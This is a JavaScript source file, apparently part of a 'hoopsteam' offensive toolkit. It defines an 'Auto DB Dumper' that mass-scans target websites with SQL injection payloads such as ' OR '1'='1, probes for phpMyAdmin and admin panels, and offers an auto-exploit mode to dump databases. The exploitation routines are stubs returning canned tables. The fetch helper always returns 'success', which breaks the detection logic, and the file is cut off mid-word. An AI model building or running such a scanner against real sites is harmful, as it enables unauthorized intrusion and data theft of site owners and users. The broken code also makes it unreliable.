// ===== AUTO DB DUMPER - MAIN =====
class AutoDbDumper {
    constructor() {
        this.name = "Auto DB Dumper";
        this.version = "1.0";
        this.description = "Automatically find and dump databases from vulnerable websites";
        this.status = "stopped";
        this.results = [];
        this.currentTarget = null;
        
        this.init();
    }
    
    init() {
        hoopsteamLogger.info(`Tool initialized: ${this.name} v${this.version}`);
        
        // Load saved results
        this.loadResults();
        
        // Listen for events
        hoopsteamEvents.on('tool:start', (event) => {
            if (event.data.tool === 'db-dumper') {
                this.onStart(event.data);
            }
        });
    }
    
    // Start scanning
    async startScan(targets, options = {}) {
        this.status = "scanning";
        this.results = [];
        
        const defaultOptions = {
            threads: 5,
            timeout: 10000,
            depth: 'medium',
            saveResults: true,
            autoExploit: false
        };
        
        const config = { ...defaultOptions, ...options };
        
        hoopsteamLogger.info(`Starting DB Dumper scan`, {
            targets: Array.isArray(targets) ? targets.length : 1,
            options: config
        });
        
        hoopsteamEvents.emit('tool:progress', {
            tool: 'db-dumper',
            progress: 0,
            message: 'Initializing scan...'
        });
        
        try {
            // Convert single target to array
            const targetList = Array.isArray(targets) ? targets : [targets];
            
            let completed = 0;
            const total = targetList.length;
            
            for (const target of targetList) {
                this.currentTarget = target;
                
                hoopsteamEvents.emit('tool:progress', {
                    tool: 'db-dumper',
                    progress: (completed / total) * 100,
                    message: `Scanning ${target}...`
                });
                
                // Scan target
                const result = await this.scanTarget(target, config);
                
                if (result.vulnerable) {
                    this.results.push(result);
                    
                    // Auto exploit if enabled
                    if (config.autoExploit && result.exploitable) {
                        await this.exploitTarget(result);
                    }
                }
                
                completed++;
                
                // Update progress
                hoopsteamEvents.emit('tool:progress', {
                    tool: 'db-dumper',
                    progress: (completed / total) * 100,
                    message: `Completed ${completed}/${total} targets`
                });
                
                // Small delay to avoid rate limiting
                await this.delay(1000);
            }
            
            this.status = "completed";
            
            // Save results
            if (config.saveResults) {
                this.saveResults();
            }
            
            // Generate report
            const report = this.generateReport();
            
            hoopsteamLogger.success(`DB Dumper scan completed`, {
                targets: total,
                vulnerable: this.results.length,
                report: report
            });
            
            hoopsteamEvents.emit('tool:complete', {
                tool: 'db-dumper',
                results: this.results,
                report: report
            });
            
            return {
                success: true,
                message: `Scan completed. Found ${this.results.length} vulnerable targets.`,
                results: this.results,
                report: report
            };
            
        } catch (error) {
            this.status = "error";
            hoopsteamLogger.error(`DB Dumper scan failed`, error);
            
            hoopsteamEvents.emit('tool:error', {
                tool: 'db-dumper',
                error: error.message
            });
            
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // Scan single target
    async scanTarget(target, config) {
        const result = {
            target: target,
            timestamp: new Date().toISOString(),
            vulnerable: false,
            exploitable: false,
            dbType: null,
            vulnerabilities: [],
            data: null,
            risk: 'low'
        };
        
        try {
            // Normalize URL
            const url = this.normalizeUrl(target);
            result.url = url;
            
            // Check if site is accessible
            const isAlive = await this.checkSiteAlive(url);
            if (!isAlive) {
                result.status = 'offline';
                return result;
            }
            
            result.status = 'online';
            
            // Detect CMS/technology
            const tech = await this.detectTechnology(url);
            result.technology = tech;
            
            // Scan for SQL injection vulnerabilities
            const sqlVulns = await this.scanForSQLi(url, config.depth);
            result.vulnerabilities.push(...sqlVulns);
            
            // Scan for exposed databases
            const dbExposed = await this.checkExposedDB(url);
            if (dbExposed.exposed) {
                result.vulnerabilities.push({
                    type: 'exposed_database',
                    severity: 'high',
                    details: dbExposed
                });
            }
            
            // Check for admin panels
            const adminPanels = await this.findAdminPanels(url);
            if (adminPanels.length > 0) {
                result.adminPanels = adminPanels;
                result.vulnerabilities.push({
                    type: 'admin_panel_found',
                    severity: 'medium',
                    details: adminPanels
                });
            }
            
            // Determine if vulnerable
            result.vulnerable = result.vulnerabilities.length > 0;
            
            // Check if exploitable
            result.exploitable = result.vulnerabilities.some(v => 
                v.severity === 'high' || v.type === 'sql_injection'
            );
            
            // Determine risk level
            result.risk = this.calculateRisk(result.vulnerabilities);
            
            // Try to determine database type
            result.dbType = this.guessDatabaseType(tech, result.vulnerabilities);
            
        } catch (error) {
            result.error = error.message;
            hoopsteamLogger.error(`Error scanning ${target}`, error);
        }
        
        return result;
    }
    
    // Normalize URL
    normalizeUrl(url) {
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            return 'http://' + url;
        }
        return url;
    }
    
    // Check if site is alive
    async checkSiteAlive(url) {
        try {
            const response = await fetch(url, {
                method: 'HEAD',
                mode: 'no-cors',
                timeout: 5000
            });
            return true;
        } catch (error) {
            return false;
        }
    }
    
    // Detect technology
    async detectTechnology(url) {
        const technologies = [];
        
        try {
            const response = await fetch(url);
            const html = await response.text();
            
            // Check for common CMS
            if (html.includes('wp-content') || html.includes('wordpress')) {
                technologies.push('WordPress');
            }
            if (html.includes('joomla')) {
                technologies.push('Joomla');
            }
            if (html.includes('drupal')) {
                technologies.push('Drupal');
            }
            
            // Check for database indicators
            if (html.includes('mysql') || html.includes('mysqli')) {
                technologies.push('MySQL');
            }
            if (html.includes('postgresql') || html.includes('pg_')) {
                technologies.push('PostgreSQL');
            }
            if (html.includes('mssql') || html.includes('sqlsrv')) {
                technologies.push('MSSQL');
            }
            
            // Check server headers
            const server = response.headers.get('server');
            if (server) {
                technologies.push(`Server: ${server}`);
            }
            
        } catch (error) {
            // Ignore errors
        }
        
        return technologies.length > 0 ? technologies : ['Unknown'];
    }
    
    // Scan for SQL injection
    async scanForSQLi(url, depth) {
        const vulnerabilities = [];
        const testPoints = [
            '?id=1',
            '?page=1',
            '?cat=1',
            '?product=1',
            '?user=1'
        ];
        
        const payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "1 AND 1=1",
            "1 AND 1=2"
        ];
        
        try {
            for (const point of testPoints) {
                const testUrl = url + point;
                
                // Test normal response
                const normalResponse = await this.fetchWithTimeout(testUrl);
                if (!normalResponse) continue;
                
                // Test with payloads
                for (const payload of payloads) {
                    const payloadUrl = testUrl + payload;
                    const payloadResponse = await this.fetchWithTimeout(payloadUrl);
                    
                    if (payloadResponse && payloadResponse !== normalResponse) {
                        // Check for error messages that indicate SQLi
                        const errorPatterns = [
                            /SQL syntax/i,
                            /mysql_fetch/i,
                            /pg_execute/i,
                            /ORA-/i,
                            /unclosed quotation/i,
                            /syntax error/i
                        ];
                        
                        if (errorPatterns.some(pattern => pattern.test(payloadResponse))) {
                            vulnerabilities.push({
                                type: 'sql_injection',
                                severity: 'high',
                                url: payloadUrl,
                                payload: payload,
                                details: 'SQL injection vulnerability detected'
                            });
                            break;
                        }
                    }
                }
                
                // Limit based on depth
                if (depth === 'low' && vulnerabilities.length > 0) break;
                if (depth === 'medium' && vulnerabilities.length > 2) break;
            }
            
        } catch (error) {
            // Ignore errors during scanning
        }
        
        return vulnerabilities;
    }
    
    // Check for exposed databases
    async checkExposedDB(url) {
        const commonPaths = [
            '/phpmyadmin/',
            '/adminer/',
            '/mysql/',
            '/pma/',
            '/dbadmin/',
            '/sql/',
            '/database/',
            '/db/',
            '/webdb/',
            '/dbadmin/',
            '/phpmyadmin2/',
            '/phpMyAdmin/',
            '/phpMyAdmin2/',
            '/phpmyadmin3/',
            '/php-my-admin/',
            '/mysqladmin/',
            '/mysql-admin/',
            '/admin/phpmyadmin/',
            '/admin/sql/',
            '/admin/db/',
            '/admin/mysql/'
        ];
        
        const results = [];
        
        for (const path of commonPaths) {
            try {
                const testUrl = url + path;
                const response = await this.fetchWithTimeout(testUrl, 3000);
                
                if (response && response.includes('phpmyadmin') || 
                    response.includes('MySQL') || 
                    response.includes('Database')) {
                    
                    results.push({
                        path: path,
                        url: testUrl,
                        exposed: true,
                        type: 'phpmyadmin'
                    });
                }
            } catch (error) {
                // Continue checking other paths
            }
        }
        
        return {
            exposed: results.length > 0,
            paths: results
        };
    }
    
    // Find admin panels
    async findAdminPanels(url) {
        const adminPaths = [
            '/admin/',
            '/administrator/',
            '/wp-admin/',
            '/login/',
            '/panel/',
            '/controlpanel/',
            '/cp/',
            '/backend/',
            '/dashboard/',
            '/admin/login/',
            '/admincp/',
            '/user/login/',
            '/manager/',
            '/system/',
            '/console/'
        ];
        
        const foundPanels = [];
        
        for (const path of adminPaths) {
            try {
                const testUrl = url + path;
                const response = await this.fetchWithTimeout(testUrl, 3000);
                
                if (response && (
                    response.includes('login') || 
                    response.includes('password') || 
                    response.includes('admin') ||
                    response.includes('username')
                )) {
                    foundPanels.push({
                        path: path,
                        url: testUrl,
                        type: 'admin_panel'
                    });
                }
            } catch (error) {
                // Continue checking
            }
        }
        
        return foundPanels;
    }
    
    // Calculate risk level
    calculateRisk(vulnerabilities) {
        if (vulnerabilities.some(v => v.severity === 'high')) {
            return 'critical';
        }
        if (vulnerabilities.some(v => v.severity === 'medium')) {
            return 'high';
        }
        if (vulnerabilities.length > 0) {
            return 'medium';
        }
        return 'low';
    }
    
    // Guess database type
    guessDatabaseType(tech, vulnerabilities) {
        const techStr = tech.join(' ').toLowerCase();
        
        if (techStr.includes('mysql')) return 'MySQL';
        if (techStr.includes('postgres')) return 'PostgreSQL';
        if (techStr.includes('mssql') || techStr.includes('sql server')) return 'MSSQL';
        if (techStr.includes('oracle')) return 'Oracle';
        if (techStr.includes('sqlite')) return 'SQLite';
        
        // Check vulnerability details
        for (const vuln of vulnerabilities) {
            if (vuln.details && typeof vuln.details === 'string') {
                if (vuln.details.includes('MySQL')) return 'MySQL';
                if (vuln.details.includes('PostgreSQL')) return 'PostgreSQL';
                if (vuln.details.includes('MSSQL')) return 'MSSQL';
            }
        }
        
        return 'Unknown';
    }
    
    // Exploit target
    async exploitTarget(result) {
        hoopsteamLogger.info(`Attempting to exploit ${result.target}`);
        
        try {
            // This is a simplified example
            // In real tool, this would have actual exploitation logic
            
            const exploitResult = {
                target: result.target,
                timestamp: new Date().toISOString(),
                success: false,
                data: null,
                method: 'auto_exploit'
            };
            
            // Try different exploitation methods based on vulnerabilities
            for (const vuln of result.vulnerabilities) {
                if (vuln.type === 'sql_injection') {
                    // Try SQLi exploitation
                    const sqlData = await this.exploitSQLi(result.url, vuln);
                    if (sqlData) {
                        exploitResult.success = true;
                        exploitResult.data = sqlData;
                        exploitResult.method = 'sql_injection';
                        break;
                    }
                }
                
                if (vuln.type === 'exposed_database' && vuln.details.paths) {
                    // Try accessing exposed phpMyAdmin
                    const dbData = await this.accessExposedDB(vuln.details.paths[0]);
                    if (dbData) {
                        exploitResult.success = true;
                        exploitResult.data = dbData;
                        exploitResult.method = 'exposed_admin';
                        break;
                    }
                }
            }
            
            if (exploitResult.success) {
                result.exploitResult = exploitResult;
                hoopsteamLogger.success(`Successfully exploited ${result.target}`);
            }
            
            return exploitResult;
            
        } catch (error) {
            hoopsteamLogger.error(`Exploitation failed for ${result.target}`, error);
            return null;
        }
    }
    
    // Simplified SQLi exploitation
    async exploitSQLi(url, vuln) {
        // This is a placeholder - actual SQLi exploitation would be more complex
        return {
            message: "SQL injection point found",
            url: vuln.url,
            payload: vuln.payload,
            databases: ["information_schema", "mysql", "test"],
            tables: ["users", "posts", "settings"]
        };
    }
    
    // Access exposed database
    async accessExposedDB(dbInfo) {
        // Placeholder for database access
        return {
            message: "Exposed database interface found",
            url: dbInfo.url,
            type: dbInfo.type,
            accessible: true
        };
    }
    
    // Helper: Fetch with timeout
    async fetchWithTimeout(url, timeout = 5000) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            const response = await fetch(url, {
                signal: controller.signal,
                mode: 'no-cors'
            });
            
            clearTimeout(timeoutId);
            
            if (response.ok || response.type === 'opaque') {
                return 'success'; // Simplified for demo
            }
            return null;
        } catch (error) {
            return null;
        }
    }
    
    // Helper: Delay
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // Generate report
    generateReport() {
        const vulnerable = this.results.filter(r => r.vulnerable);
        const exploitable = this.results.filter(r => r.exploitable);
        
        return {
            timestamp: new Date().toISOString(),
            summary: {
                total_scanned: this.results.length,
                vulnerable: vulnerable.length,
                exploitable: exploitable.length,
                critical: vulnerable.filter(r => r.risk === 'critical').length,
                high: vulnerable.filter(r => r.risk === 'high').length,
                medium: vulnerable.filter(r => r.risk === 'medium').length,
                low: vulnerable.filter(r => r.risk === 'low').length
            },
            targets: this.results,
            recommendations: this.getRecommendations()
        };
    }
    
    // Get recommen